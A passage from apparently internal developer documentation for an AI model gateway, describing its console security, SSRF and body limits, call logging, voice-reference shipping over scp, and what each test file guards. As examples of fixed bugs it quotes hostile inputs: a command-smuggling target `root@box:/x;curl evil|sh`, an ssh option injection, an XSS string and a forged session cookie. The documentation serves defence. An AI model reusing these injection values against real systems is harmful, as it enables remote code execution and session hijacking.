condition the API uses (any user or a master key) — locking only on an ADMIN credential
left a gateway with only `role: user` accounts API-closed and console-open. The users
editor keeps "someone can sign in" true via `main.admin_change_refusal` (a first
non-admin user, and deleting/demoting/disabling the last enabled admin with a key while
no master key exists, are refused with a `?refused=<code>` banner from the fixed
`_USER_REFUSALS` table); an old store.db already in the users-but-no-admin state stays
locked and the login page names `api_key` in config.yaml as the way in
(`test_ui_lock.py`). The `/ui` console
session is gated by `_ui_guard` once locked: an encrypted cookie (`strict`) carrying
`main.admin_session_tag` — the fingerprint of the credential it was opened with,
re-checked per request, so rotating a key or demoting/deleting an admin ends its
sessions. Before that, `_ui_guard` refuses every CROSS-SITE request to /ui
(`_cross_site`: `Sec-Fetch-Site` other than `same-origin`/`none`, else a foreign
Origin/Referer; no header = curl, passes): POST → 403, GET → a page whose same-origin
*Continue* link opens it — for a VIEW only: every state-changing console route is
POST-only (`admin._POST_ACTIONS`), so for an action URL that page offers no way to run
it. Note `same-site`
counts as foreign — another service on the same IP but another port lands on that page
too, deliberately. Behind a reverse proxy the public host must arrive in `Host` or
`X-Forwarded-Host`, or browsers without fetch metadata get 403 on every POST. Every /ui
response carries `_UI_SEC_HEADERS` (no framing, nosniff); the cookie is
`samesite=strict`, and `Secure` whenever the login came in over HTTPS (`_is_https`: the
URL scheme or `X-Forwarded-Proto: https` — never unconditionally, a plain-http LAN
install would then loop on the login). `login_post` counts failures per client IP
(`_login_fails`, in memory, `_LOGIN_MAX_FAILS` 10 per `_LOGIN_WINDOW_S` 300 s → 429 +
`Retry-After` without checking the key; a good login clears the IP; `X-Forwarded-For`
deliberately ignored, so behind a proxy the limit is shared) — `test_ui_login.py`. All values the console puts into JavaScript go through
`data-*` attributes (`data-confirm` + `_CONFIRM_JS`) or `_js_json` — never
`html.escape` into an inline handler (`test_ui_escaping.py`).

**What clients send is bounded.** `main._BodyLimit` (pure ASGI, added BEFORE
`admin.register` so it sits inside `_ui_guard` — a BaseHTTPMiddleware's task group would
turn its 413 into a 500) caps every body at `max_body_mb` (config, default 200, hot):
Content-Length refused up front, chunked counted in `receive` and raised as
HTTPException(413) from the endpoint's own read. `admin._form`/`_form_multi` read through
`_form_raw` with `_FORM_MAX_BYTES` (16 MB). Client URLs (`_decode_ref_blob` →
`_fetch_ref_url`) are an SSRF-with-readback surface (the bytes come back at
`/v1/jobs/<id>/input/<n>`): every resolved address must pass `ref_addr_blocked` (not
global or multicast = blocked; v4-mapped judged as v4; `ref_url_allow_cidrs` opens
ranges), the request goes to the CHECKED IP with the original Host header and
`sni_hostname` (no second lookup → no rebinding), no redirects, body counted against
`_REF_FETCH_MAX_BYTES`. `/v1/generations` fetches only `images` keys in
`_gen_image_slot_names` (param or label), the image shim only as many `ref_images` as
the alias has slots (`test_ref_url_fetch.py`, `test_body_limit.py`).

## Stats recording

Every forward calls `stats.record_call(...)` fire-and-forget via
`asyncio.create_task` — never raises into the request path. **Refused** calls are
recorded too, by the app-wide `HTTPException` handler (`_rejected_call` →
`_record_rejected`): anything turned away before a backend saw it (no healthy
backend, park timeout, quota, unknown alias, bad key) used to leave NO trace at
all, which is precisely the call you go looking for in LLM Calls. Such rows carry
backend `stats.REFUSED_BACKEND` = `(refused)` (defined THERE, not in `main`, because
the aggregates are what must exclude it), an empty `model` (none was ever resolved),
the status, and the reason as the stored response body. That marker is a call-log
entry only: `summary()` keeps it out of `by_backend`/`by_model` — a pseudo-backend
with 0 tokens/0 cost/0 ms says nothing about any backend, and its empty model splits
the alias into two rows — and reports it as `refused_count`/`refused_24h`, which the
Statistic tab shows as its own card (totals and `by_source` still count it: a refused
call is real traffic from that user). `request.state.gw_dispatched` (set in
`_dispatch_over` once an adapter answered, and in `run_generation` right after
`jobs.create`) prevents a second row when an endpoint re-raises an upstream error —
and `gw_alias`/`gw_body`/`gw_endpoint` carry the context the handler cannot see.
The generation arm of that flag is not cosmetic: `gen_done_or_502` raises AFTER a
job ran, so without it a **failed media job** was logged a second time as
`(refused)`, 0 ms, no backend — a request that was in fact served and failed
(measured 2026-08-25). The invariant: once a job row exists, the JOB owns the
outcome; only refusals BEFORE it (no eligible backend, quota, malformed request)
belong in the call log. `admin._call_kind()` partitions that log into
`voice`/`media`/`llm` so each row has exactly one home — media refusals show under
Media Jobs, not LLM Calls. The rule is `stats.KIND_PREFIXES` (endpoint prefixes), and
each list is filled by `stats.recent_calls(kind, …)` filtering IN SQL — the lists used
to take the newest 300 of the whole log and filter afterwards, which left Voice Calls
empty on any busy LLM day, and the Media Jobs tick ran all six `summary()` scans just
for that (≈0.6 s at 300k rows; now one indexed read of `(refused)` rows). The user
pickers read `stats.sources()` (every source, index-only), and `summary()`/`sources()`
are memoised 30 s (`_MEMO_TTL_S`) — the per-call lists never are. A refused row holds what the CALLER chose (model, x-source,
path — before or without auth), so `_clip` cuts each to `_LOG_FIELD_MAX` (200; `_source_of`
cuts x-source for every row) and 401 rows are capped at `_UNAUTH_LOG_PER_MIN` (60) per
minute, the overflow summarised in one log line (`test_rejected_log.py`). The same handler renders `/v1/messages` errors in
Anthropic shape, so that form lives in ONE place. Cost from pricing
cached at discovery (`normalize_pricing`: Together per-million, OpenRouter
per-token, plus OpenRouter's cache prices), computed ONCE in `_record`: the backend's own figure
first (`adapters.reported_cost` — OpenRouter's `usage.cost`, exact to the cent against
its dashboard, incl. discounts and routing the cached listing cannot know), else
`main._cost_usd`, which prices `cache_read`/`cache_write` at their own rate (input
price where none is listed) — a cache read is often 1/50 of fresh input. Streaming records the backend's usage chunk (the adapter always
requests `include_usage` upstream); a backend that reports zeros/nothing
(LocalAI streams all-zero usage — measured) gets gateway estimates instead
(content-delta count ≈ completion tokens, ~chars/4 for the prompt). A stream that
does NOT end normally is recorded too, from the generator's `finally`
(`_record_end`, both the normalized and the Anthropic passthrough stream): status
499 when the client left (Esc in Claude Code — Starlette closes or cancels the body
iterator), 502 when the upstream dropped mid-answer, with the tokens counted so far.
Before, `_record` sat after the `finally` and such calls never reached the log — nor
the month-cost quota, which sums `cost_usd` over every row. The body iterator is an
`adapters._StreamBody`, not the bare generator: an async generator that never STARTED
runs no `finally`, and both bridges yield their own opening event before they read from
the adapter — so a client gone in that window (Esc after a long park; with ASGI 2.4 the
first `send` fails) used to leak the in-flight slot for good, lose the pooled connection
and write no row. `_StreamBody.aclose()` ends such a call itself (499), its finalizer does
the same for a consumer dropped without any close, and `_StreamEnd` makes the end
happen exactly once whoever gets there first. A backend's OWN in-band failure
(OpenRouter's `data: {"error": …}` under HTTP 200, Anthropic's `event: error`) is seen
by the normalizer/sniffer and books 502 — not 200 when it passed through, not 499 when
a bridge stopped on it and closed the source; the Responses bridge fails on any in-band
`error`, including OpenRouter's shape that still carries `choices` with
`finish_reason: "error"` (it used to complete around the truncated text).

## Voice cloning (`/v1/audio/speech`)

TTS backends read `voice` strictly as a
file on THEIR host (no base64/URL/upload API — measured). The voice library
(`voiceref/` blobs + store `voice_library`, UI in the Voice sub-tab) therefore
ships references via scp to EVERY target in `voice_ref_hosts` (settings;
comma-separated `user@host:/abs/host/dir`, host-side dirs may differ — docker
mounts), while `voice_ref_dir` is the single model-visible path written into
`voice`; `voice:"lib:<name>"` resolves to the shipped path + ref_text in
`route()`. An empty ref_text is auto-transcribed: local faster-whisper first
(lazy CPU import; the one heavyweight entry in `requirements.txt`), a backend
whisper model as fallback. The playground's synthesis stash (`voice_audio`) and the
call log's stored audio (`call_audio`) are served under the BACKEND's Content-Type from
the /ui origin, so `admin._audio_headers` plays only `audio/*` and turns anything else
(svg, html …) into an `application/octet-stream` attachment, nosniff always
(`test_audio_content_type.py`).

## Tests — what each one guards

Every test file also says this in its own docstring; this is the overview.

`ls tests/test_*.py` is the count of record (seventy-eight files on 2026-10-03). There
is no blanket suite on purpose: each file exists because the mechanism it guards fails
SILENTLY — the result looks plausible, nothing raises.
`test_anthropic_bridge.py`, `test_prune_branch.py` (a
dead-branch prune that cascades one node too far or too few surfaces as an aborted
generation, not an exception), `test_chain_export_node.py`, `test_chain_hooks.py`,
`test_chain_mesh_param.py`, `test_ratelimit_headers.py`, `test_scheduler.py`,
`test_admin_live.py`, `test_err_text.py`, `test_gen_backend_for.py`,
`test_playground_files.py`, `test_meshy.py`, `test_meshy_adapter.py` — plus the four
the Tripo backend brought:
`test_cloudtask.py` (the option-form reader: a field the schema-driven editor loses —
a missing `opt__<key>`, a type parsed wrong — does not error, it silently saves that
key's DEFAULT, so an alias's textures quietly turn off on the next Save);
`test_tripo.py` (the pure builder/parser: a body Tripo REJECTS costs a round trip, but
one it accepts with the wrong face cap, texture bucket or rig type delivers a
plausible WRONG mesh — and a task status treated as "not finished yet" instead of
terminal polls to `max_wait` holding the slot);
`test_tripo_adapter.py` (the run ORDER and the error classes: a rig-check that does
not gate the rig spends 25 credits on an unriggable mesh, a 403/2010 classed as final
stops the failover that would have found the next candidate, and a convert or clip
that quietly goes missing is a smaller delivery than the client asked for);
`test_cloud_editor.py` (the console's kind-neutrality — a job view that renders
nothing for a Tripo run, an editor offering the wrong backends, a type select whose JS
never reveals the cloud option block: all three are silent in the BROWSER).
Newest are the two the execution-fault quarantine brought:
`test_gen_quarantine.py` (the pure fault bookkeeping — a quarantine that never
triggers leaves a broken backend eating every job, one that triggers on an UNPROVEN
fault lets a single bad workflow disable an alias's whole fleet, and a candidate that
gets its probe-once head start back on expiry walks straight to the front again);
`test_run_job_failover.py` (what `_run_job` does with an execution error: every case
ends in a plausible-looking job row — a job dead on the first candidate reads like a
workflow error, a fault charged to the winner idles a healthy backend for 15 minutes,
and a cloud candidate that fails over re-runs a task the vendor already BILLED);
`test_ws_progress.py` (folding ComfyUI's /ws messages into a job's progress: 0.30
BROADCASTS every prompt's progress to every listener, so a missing prompt_id gate
shows a job a stranger's step count — a lying feature, not an absent one — and an ETA
looks plausible whatever it says, which is how timing the steps from job start
predicted 250 s for a 15 s job);
`test_config_watch.py` (the config hot reload's own watch: `awatch` on the config FILE
keeps a watch on that file's INODE, and sed/vim/most editors save by renaming a sibling
over it — measured 2026-09-08 on a fresh Debian 13 install, one of four edits detected,
then nothing ever again, while the gateway went on serving the config it read first and
said so nowhere; so the test performs the three saves that got it wrong — rename-replace,
an in-place append after it, a second rename-replace — and counts the reloads; plus the
same three through a SYMLINKED config.yaml, the shape the stub-instance harness ships,
where resolving the link before watching leaves the operator's own save — in the lexical
parent — unwatched entirely).
`test_context_length.py` (the `context_length` every `/v1/models` entry carries: a
client that finds none does not error, it ASSUMES one — Oh My Pi 128k — and builds a
33k prompt for a 32k model, so the backend's 400 is the first anyone hears of it
(measured 2026-09-08, glm-5.3-flash on dx10-01); it pins every listing shape
`adapters.extract_context` reads, the `model_context` rule beating the learned value,
the llama-swap enrichment asking `/upstream/<model>/v1/models` for LOADED models only —
asking an unloaded one would load it — the merge that keeps what this poll did not see,
and the MINIMUM a bare id or alias publishes over its backends).
`test_netscan.py` (the LAN scan: a wrong range silently scans nothing or a whole
site, a misclassified server pre-fills a backend the gateway cannot discover, a
"known" match that misses re-offers every backend already there, and a scan that
loads an unloaded model or writes the store would be a side effect nobody asked
for — so it pins address derivation, the cap, every fingerprint branch, the
registered match, one real-socket sweep, the status snapshot and both renderers).
Newest are the two the per-backend model filter brought:
`test_model_filter.py` (the allow/deny globs: a whitelist is one typo away from
matching nothing, and a backend narrowed to zero models stays UP, answers
`/v1/models` with an empty list and reports no error — every symptom then points
elsewhere, an alias with no candidates reading as "all backends busy". It pins the
pure rule, `refresh_backend` applying it to the set the rest of the gateway reads,
and the two reporting rules: a backend that never polled reports NO counts — deriving
`(0, 0)` from its empty set blames the filter for an unreachable host — while the
summary carries the globs themselves, because the editor pre-fills a config-defined
backend from there and a field it omits comes back blank on the next Save);
`test_backend_form_tabs.py` (the backend form's four tabs: a field lost or duplicated
while re-sorting the panes is invisible in the HTML and silently CLEARS or overwrites
its stored value on the next Save, and a pane without a button is unreachable in the
browser without anything erroring. It derives the field list from `backend_save` by
AST — so a field added there and forgotten in the form fails the test, not production).
`test_current_model.py` (llama-swap's `<backend>/current`: every wrong pick is a
plausible answer — a chat call handed to the embedding model loaded beside it, a pick
against a stale list or a "pick something" fallback that SWAPS a model in, a backend
with nothing loaded taken as a candidate so a parkable call 503s. It pins the parser
and the pick rule, routing incl. park-instead-of-spill, the live refresh, the
allow-list, the catalog and the `loaded` display).
`test_anthropic_endpoint_404.py` (what the gateway SAYS when an Anthropic model is
asked for on a chat path: the explaining 404 read its candidates from `_route_index`,
which holds aliases and BARE ids only, so every `<backend>/<model>` pin fell through to
the generic `503 No healthy backend` — a healthy backend reported as absent, the licence
rule that caused the refusal never mentioned, and a client that does not retry a 404
retrying a 503 forever: measured 2026-09-12 on prod, 3195 of them in three hours from
one agent. It pins both spellings, the messages path where the same empty set really
does mean DOWN, and — the guard on the fix itself — that the boundary stays CLOSED:
only the message changed, `serves_path` still makes that backend no candidate at all).
And one guards the project's own NAME (`test_project_name.py`): a stale mention of the
pre-rename name left in `deploy.sh` points a deploy at a path that no longer exists, in
`ai-hub.service` at a `WorkingDirectory` that is gone, in the README at a clone URL that
redirects — none of it raises, all of it fails at the worst moment. It walks
`git ls-files` and allows the old name only in `docs/superpowers/`, `docs/archive/`
(history keeps the name of its time) and ONCE each in README.md/CLAUDE.md as the
migration note, and it pins `deploy.sh`'s `DEST`/`SERVICE` against the unit file.
`test_faults.py` (the backend fault log: a log that records nothing, records an ongoing
outage once per POLL, splits one crash into twenty lines or merges two different ones
looks exactly like a healthy fleet — it pins the recording points in `refresh_backend`
and `_dispatch_over` incl. a failover that ends in 200, the bundling, the downtime
clipping and open outage, persistence across a restart, and what Dashboard/Statistic
render).
`test_ui_session.py` (the /ui session cookie: a forgeable session looks exactly like a
working login. `store.decrypt_secret`'s legacy-plaintext passthrough made a hand-typed
`gw_session={"u":"admin",…}` an admin session (review 2026-09-23), so `_session_user`
decrypts STRICT; and the cookie carries `main.admin_session_tag` — a fingerprint of the
credential it was opened with, re-checked per request — so rotating the master key or
deleting/disabling/demoting an admin revokes its sessions instead of leaving them valid
for 12 h).
`test_ui_escaping.py` (values the console puts into JAVASCRIPT: `html.escape` is decoded
by the browser before an inline handler is parsed, so `_btn`'s old
`onclick="return confirm('…')"` broke on any `'` — the link then deleted WITHOUT asking
— and an unauthenticated `x-source: ::1%'+alert(1)+'` stored as an IP alias ran as
script. Confirm texts are now `data-confirm` read by the one delegated `_CONFIRM_JS`
handler `_page` emits; JSON inside `<script>` goes through `_js_json`, which escapes
`<`/`>`/`&` so a backend-reported model id cannot close the block).
`test_ui_csrf.py` (cross-site requests to /ui: console actions WERE plain GET links
and a `samesite=lax` cookie rides on a cross-site top-level GET — any page the admin
opened could delete users or restart a ComfyUI; bootstrap-open has no cookie at all.
`_ui_guard` refuses what `_cross_site` flags — `Sec-Fetch-Site` other than
`same-origin`/`none`, else a foreign Origin/Referer; no header at all = curl, passes —
with 403 for a POST and, for a GET of a VIEW, a page whose same-origin *Continue* link
opens it (links from chat or mail still work one click later); a foreign GET of an
ACTION gets no such button — actions are POST-only (`test_ui_post_only.py`). Every /ui
response carries `_UI_SEC_HEADERS` (no framing, nosniff), the cookie is
`samesite=strict`).
`test_voice_ship_targets.py` (`voice_ref_hosts` is the one setting that reaches a
command line — `ssh <host> "mkdir -p <dir>"` + `scp`, as root on prod — and the only
check was "dir starts with /": `root@box:/x;curl evil|sh` ran remotely, a host
`-oProxyCommand=…` locally, and both look like a normal ship. `main.parse_voice_target`
holds host and dirs to plain characters BEFORE any process is spawned, and the argv
puts `--` before the host and `shlex.quote`s the remote dir).
Added by the review round of 2026-09-23 (every one guards a mechanism whose failure
looks like a working gateway):
`test_ui_lock.py` (when /ui locks: `ui_locked()` used to lock on an ADMIN credential
only, so a gateway with nothing but `role: user` accounts had its API closed and its
console — pre-filled user keys included — open to the LAN, and deleting, demoting or
disabling the last admin silently opened it again. Pins that any user or a master key
locks, that `admin_change_refusal` refuses a first non-admin and the loss of the last
admin credential, and that an old store.db already in the "users, no admin" state stays
locked while the login page names `api_key` in config.yaml as the way back).
`test_ui_login.py` (the login form, the one unauthenticated write path into the admin
area: without a limit it can be guessed at any speed and each miss is an ordinary 401.
Pins 10 failures per IP in 5 min → 429 with `Retry-After`, even for the right key; the
reset on a valid login; the bounded table; and `Secure` on the cookie exactly for HTTPS
/ `X-Forwarded-Proto: https` — never on plain LAN http, where the login would loop).
`test_ref_url_fetch.py` (client URLs the gateway fetches itself and keeps readable under
`/v1/jobs/<id>/input/<n>` — SSRF with read-back: localhost /ui, backend admin ports,
169.254.169.254. Pins `ref_addr_blocked` incl. v4-mapped addresses, the check of EVERY
resolved address, connecting to the checked IP with the original Host and SNI (no DNS
rebinding), no redirects, the streamed byte cap, the `ref_url_allow_cidrs` opt-in, and
that `images` keys that are no slot, or surplus `ref_images`, are never fetched).
`test_body_limit.py` (bodies are read whole and were unbounded — the first symptom is
the OOM kill. Pins `max_body_mb` (default 200, 0 = off), 413 on a declared
Content-Length and while counting a chunked body, and the console forms' own 16 MB cap).
`test_health_access.py` (`/health` handed anyone the whole inventory — backends with
hosts, model ids, aliases, balances, the fault log — on an otherwise locked gateway.
Pins the short form for strangers and user keys, the full view for a master/admin key
(Bearer or x-api-key), a /ui session and bootstrap-open, and model ids only with
`?verbose=1`, else `models_count`).
`test_rejected_log.py` (refusals are logged before or without auth with CALLER-chosen
strings: a 50 MB "model name" per request, or thousands of 401 rows a minute pushing
real calls out of LLM Calls. Pins `_clip` to `_LOG_FIELD_MAX`, x-source cut in
`_source_of`, and at most `_UNAUTH_LOG_PER_MIN` 401 rows per minute while other
refusals stay unthrottled).
`test_gen_limits.py` (a client `ttl_s: 10**12` kept a job on disk forever, and async
generation jobs — unlike parked chat calls — had no cap, sitting `queued` like a busy
fleet. Pins `_clamp_ttl` to `jobs.max_ttl_s` and the 503 with `Retry-After` from
`max_queued_gen` async jobs on, sync jobs not counted).
`test_mapping_values.py` (what a client value may become in a workflow: a LIST is a
node LINK in ComfyUI's API format and rewires the graph; a path in a mapped file field
reads any file ComfyUI can read — another job's output included — and delivers it as a
harmless-looking result. Pins that the injector skips lists and mismatched dicts,
`_client_param_refusal`'s 400 for stage 1 and successor, backend paths only for an
admin key, bootstrap-open or `client_path: true` (a Mapping checkbox), only VALUES that
name a file judged (`quad`, `5000` pass), the same 400 for a list prompt, and that
`mesh_format`-style settings are no file fields).
`test_audio_content_type.py` (the voice playground stash and stored call audio were
served from the /ui origin under the BACKEND's content type — SVG or HTML from there
runs script in the admin session. Pins: only `audio/*` plays, anything else is an
octet-stream download, `nosniff` always).
`test_model_lookup_allow.py` (`/v1/models/{id}` only checked that SOME key was sent; a
key restricted to one alias could query every alias, backend and model id. Pins
`_model_allowed` and a 404 outside the grant, identical to "unknown").
`test_backend_key_field.py` (the backend key sat as a plaintext `value` in the form, and
a config backend's key was missing from it, so its first Save wrote a store copy
WITHOUT the key — which then failed discovery on auth. Pins: never rendered, blank
keeps it, input replaces it, `api_key_clear` removes it, the config key is carried
over, the summary carries only `api_key_set`).
`test_service_unit.py` (the systemd sandbox for a root service: the next well-meant
tightening — ProtectHome, ProtectSystem=strict, dropping AF_NETLINK — breaks voice
shipping, DB writes or Scan network without the service failing to start. Pins both
halves: the hardening is there, and those three settings are not).
`test_jobs_lifecycle.py` (the job store's state machine: every write succeeds, so a
worker finishing after a cancel overwrote `failed: cancelled by user` with `done` and a
late `set_status("running")` resurrected a cancelled row — the console showed a stopped
job as delivered; and `prune_once` deleted a job still RUNNING under a short client
`ttl_s`, after which `complete()` wrote artifacts into a directory no row points to.
Pins first-terminal-write-wins on every status writer, `merge_meta` reaching a terminal
row, and prune touching finished jobs only).
`test_gen_cancel.py` (stopping exactly one job's work: ComfyUI's bare `/interrupt`
stops whatever executes, so cancelling a queued job or a `max_wait` on a waiting prompt
killed a stranger's run, which then failed over or was charged an execution fault — and
a SYNC job was never in `_gen_tasks`, so its cancel only relabelled the row. Pins
`_stop_prompt`'s targeting — running → `/interrupt {prompt_id}`, pending → `/queue
delete`, gone/unreadable → nothing — the cancelled `generate()` stopping its own prompt,
`ComfyPromptInterrupted` ending a job without failover or fault, a sync job ended by its
cancel with the worker unwound before cancel returns, a crashed worker failing its job
instead of staying `running` forever, adapters keeping their runtime state — restart
cooldown, prompt registry — across a backend save, and fire-and-forget tasks held until
done so a restart can never leave `_comfy_restarting` set).
`test_gen_inputs.py` (what /v1/generations makes of reference images: an `images` value
the gateway cannot read — a 404 URL, broken base64 — was dropped, and the job ran on
the slot's placeholder and came back `done` with a plausible picture of the wrong thing;
pins the 400 naming the slot, and that an EMPTY value still means an empty slot).
`test_responses_bridge.py` (the Responses↔Chat bridge always yields a well-formed
object, whatever it lost on the way: a streamed tool call whose `delta.tool_calls` was
ignored ended in a clean `response.completed` with an empty message — the agent just
"decided" not to call its tool; two parallel `function_call` items as two assistant
messages are a 400 on strict servers; a stream dying mid-way closed as `completed`
around the truncated text. Pins chunked, interleaved and index-less tool-call
fragments, the output order, `response.failed` for an exception, an in-band error and
an end without `finish_reason`/`[DONE]`, and the turn merge on the request side).
`test_chat_dispatch.py` (the chat dispatch path, where every case ends in a plausible
answer: a closed keep-alive connection (`RemoteProtocolError`) or a reset skipped
failover and the fault log and arrived as a raw 500 that Claude Code renders blank; a
failover after a `ReadTimeout` on a PAID backend bought the answer twice; a 300 s
connect timeout held failover back five minutes; an upstream dropping MID-stream cut the
client's connection, which reads like a finished answer. Pins the failover classes, the
paid-backend 504, the endpoint-shaped 502, `_CHAT_TIMEOUT`, which client headers reach
a backend, that an aborted or dropped stream is booked with 499/502 and its tokens (or
it is missing from LLM Calls and the monthly cost quota) and ends in an in-band error
chunk/event, and that the body is serialised exactly once).
`test_stats_store.py` (the call log's storage and query paths: every query returns the
right rows whatever plan SQLite picks, so a lost index is invisible on ten rows and
only shows as a Dashboard tick that slows every week — 274 ms of `GROUP BY backend` over
300k rows, measured. Pins the Dashboard queries' PLANS (`idx_calls_ts_backend`), the
body store (gzip, legacy plain blobs still read, head+tail cap, refusals without their
request, body retention that keeps the row), the one-INSERT write path on
`synchronous=NORMAL`, the in-memory month sum the cost quota reads per request, the SQL
partition matching `admin._call_kind` — Voice Calls used to come up empty behind 300
newer LLM calls — the every-source user picker, the memoised aggregates, and the Users
page not waiting on reverse DNS).
`test_comfy_discover.py` (ComfyUI discovery off the event loop: the MB-sized
`/object_info` parsed on the loop every 30 s — every 3 s per DOWN backend — stalls
every request and stream and shows as nothing but "sluggish"; pins that
`_parse_object_info` runs in a worker thread and that models, LoRAs, the bypass slot
types and the executor watchdog still come out of the same fetch).
`test_ui_look.py` (how the console reads, sorts and announces itself — each only shows
in a browser: without a viewport tag a phone renders the desktop layout at a third of
its size, and the media query must lift `body{overflow:hidden}` without reaching the
desktop, where `<main>` stays the scroll container; duplicate CSS selectors override
each other silently; `.muted` must reach 4.5:1; `num()` sorted "1.2 s, 10.1 s, 102 ms"
as TEXT (run in node, `data-sv` on call and job rows); a live chip that never says
stale/offline makes dead numbers look current; Media Jobs is always live, sortable, and
keyset-paged without gaps or duplicates; `_field` ties `label for` and puts hints on
their own row; no tofu glyphs; keyboard reorder; cent sums, the year only on old dates,
"0 / ∞"; ES5 as a syntax rule; `_JOB_TICK` starts one timer; the "all" box follows its
rows).
`test_upload_pin_migration.py` (the removed "playground upload" image pin: nothing ever
supplied that upload — `NormalizedRequest.upload_image` had no writer — so it always
ran on the placeholder. The option is gone and stored `__gw_upload__` pins are
rewritten to the placeholder at startup; a lost migration would send the raw string to
ComfyUI as a file name, so the migration, the resolver's legacy fallback and the
editor's option list are pinned).
`test_ui_post_only.py` (console actions are POST-only: a GET link fires on any
navigation — preview, prefetch, a pasted URL — and nothing logs the store change. Walks
the handlers by AST (no GET route may reach a store/jobs write or a mutating callback,
no exceptions), crawls the rendered pages
(no link or `location.href` to an action), checks that names with `& + # %` survive
every action URL — the HTML escape split `a&b` into `a` + `amp;b` and ran the action on
another alias — and that the Mapping editor keeps typed edits across Update workflow, a
refused file, drag-reorder and a refused rename).
`test_ui_form_validation.py` (create/save forms refuse out loud and overwrite nothing: a
taken name used to REPLACE or MERGE the existing chat alias/user/backend/media alias,
and "1.5"/"-1"/"1e3" became an UNLIMITED cap or quota. Each refusal is a 400 with the
form re-rendered as typed, nothing is written; voice ship targets are checked on Save
with main's own rules).
`test_stream_lifecycle.py` (how a streamed dispatch ENDS: an async generator that never
started runs no `finally`, and both bridges yield their own first event before reading
the adapter — a client gone in that window leaked the in-flight slot for good, lost
the pooled connection and wrote no row; the backend just parked calls it had room for.
Pins `_StreamBody`/`_StreamEnd` — aclose after the bridges' first event, a close of a
never-read body, a consumer dropped without any close: inc == dec and exactly one 499
row — a backend's in-band error booked 502 on all four paths (it read as 499 "client
left" behind a bridge and as 200 on the plain stream), the Responses bridge failing on
OpenRouter's error-with-`choices` shape, and `x-gateway-backend`/`x-reasoning-control`
on `/v1/responses`). `test_chat_dispatch.py` also pins the Anthropic 504 on a
ReadTimeout (no failover, not `paid`) and a `PoolTimeout` as the gateway's own 503
without failover or fault row; `test_rejected_log.py` that a refusal's preview comes
from `_ends_only`, never a dump of the whole body.
Extended in the second review round (no new files): `test_gen_inputs.py` also pins the
image slots of a `workflow: <path>` alias (read from that file; an unreadable one
filters nothing — reading it as `{}` dropped every reference image, and the job came
back `done` on the loader's default) and the shims' positional mapping onto it;
`test_playground_files.py` that `mesh_format`/`remesh_mode`-style settings are no file
fields; `test_ui_look.py` that an EMPTY Media Jobs list is live and already carries the
list's scripts; `test_stats_store.py` that the Users page's reverse-DNS names stay in
memory until *Save resolved names*; `test_ui_post_only.py` the 405 console page (with
`Allow: POST` and a way back) for a GET to any POST-only path; `test_jobs_lifecycle.py`
that `set_backend` leaves a terminal row alone; `test_gen_cancel.py` that a discovery
poll spanning an adapter rebuild lands on the CURRENT instance (only for the same URL).
`test_user_group_grants.py` (the user editor's "all …" boxes: a snapshot of today's
alias names under "all chat" silently refused next week's alias — a 403 and a missing
/v1/models entry for a user the editor said may use "all". It pins the tokens resolving
per request for chat aliases, media aliases and LLM backends added later, the catalog
following them, the box submitting the token, and saving dropping covered names).
`test_ui_look.py` also pins the field rows reported after the review deploy: an input
keeps 220 px and its buttons wrap (the API key shrank to 82 px), a hint is indented by
padding (100 % + margin was cut off), a narrow column stacks label over control, list
settings take the whole column, and Logout is a button.
`test_aliases_tab.py` (the Aliases tab replaced two tabs, so every old URL is somebody's
bookmark: a redirect that drops the query opens an EMPTY editor instead of the alias it
named, a sub-tab still listed but gone renders a blank page, and an overview that is no
longer the idle right column is simply never seen again. Pins the tab set, both legacy
redirects with their query, actions redirecting to the new tab, the idle overviews with
alias→editor links and the backend filter, and the chat editor's live routes).
`test_call_cost.py` (what a call COSTS with a prompt cache: the cache split was recorded
but priced as fresh input, so an OpenRouter agent session whose context is ~95 % cache
reads was booked at 5× its bill — measured 2026-09-23, 30 xiaomi/mimo-v2.6-flash calls:
0.1625 $ booked, 0.0277 $ billed — and the monthly cost quota ran out early. Pins that
`normalize_pricing` reads OpenRouter's `input_cache_read`/`input_cache_write` (absent,
never 0), that `_cost_usd` prices each share at its own rate with the input price as
fallback and never below zero, that `_record` hands it the split, and OpenRouter's
`prompt_tokens_details.cache_write_tokens`; and that a backend's OWN figure —
`adapters.reported_cost`, OpenRouter's `usage.cost`, plus `upstream_inference_cost`
under BYOK where `cost` is only the fee — is what gets booked on the plain path, the
stream and the Messages bridge, never reaches a strict client's usage chunk, and falls
back to the price list when absent or not a finite non-negative number).
Newest are the eleven of the managed hosts — eight came with the Thunder Compute
backend (two renamed when the machine became its own level), three with the
host/service split — each guards a mechanism that fails silently, and most of them one
that BILLS while it does:
`test_thunder.py` (the pure API/disk/cost rules: a rotation that deletes the last
usable snapshot leaves nothing to restore, a disk below the snapshot's minimum is a
refused restore, a $/h that bills the included 100 GB or every vCPU is wrong without
anyone noticing, and a status Thunder renamed must read "not finished yet", never
"gone". Pins the parsers — map/list, string counts, missing fields — `choose_disk_gb`,
`hourly_cost`, the snapshot name and ownership shape, `rotation` and
`foreign_snapshots`; and `IncludedVcpus` — the blank vcpus resolved from the LIVE
`/v2/specs` shape (l40 ×1 = `[6, 8, 12]`: blank → 6, thunder-1's stored 8 accepted, 7
refused), never guessed when the specs cannot say);
`test_sshrun.py` (the ssh argv: a host without `--` before it is parsed as an OPTION,
a secret in argv is world-readable, a tunnel not bound to loopback on both ends puts
a service on the LAN, a `safe_rel` that lets `..` or a dot segment through reads files
outside the model tree, and a supervisor that does not reap leaves an `ssh -N` holding
the local port, so every later tunnel dies on `ExitOnForwardFailure`; plus the
ControlMaster: every forward once and before `--`, one local port to two remote ports
refused, `-O exit`/`stop` refused (they end every service's tunnel), a control path
ssh would expand (`%`, `$`, `~`) or longer than 86 bytes refused, a stale socket
removed but a live one kept — a master that finds a stale one runs without
multiplexing and every later `-O forward` fails);
`test_hostapi.py` (the provider seam: an index tried before the uuid can delete a
STRANGER's instance, a token echoed into an error lands in the panel and the fault
log, a 201/202 read as failure calls a paid create a failure, a price list fetched per
view hammers the API; and `options_of` must return a VALID value on every key — a
stored typo becomes the gpu_type, a "0" vcpus a 422 after the start began — with the
registry being the one list the form and the controller both read);
`test_services.py` (what runs a backend on the VM, only ever wrong on a live instance
otherwise: admin text in a command line is visible to every process via `ps` and lands
in the gateway's log, a heredoc delimiter a line of the start command equals ends the
script early, a CRLF from a textarea is a different command, a shared `~/hf-cache`
makes LLM weights "unknown" to the model sync, a stop by pattern hits the ssh shell
running it; the wrapper runs for real in `bash -c` — the lock makes a second start a
no-op, the loop restarts a killed service, the stop ends the loop AND its child and
frees the lock, a restart runs a REWRITTEN wrapper);
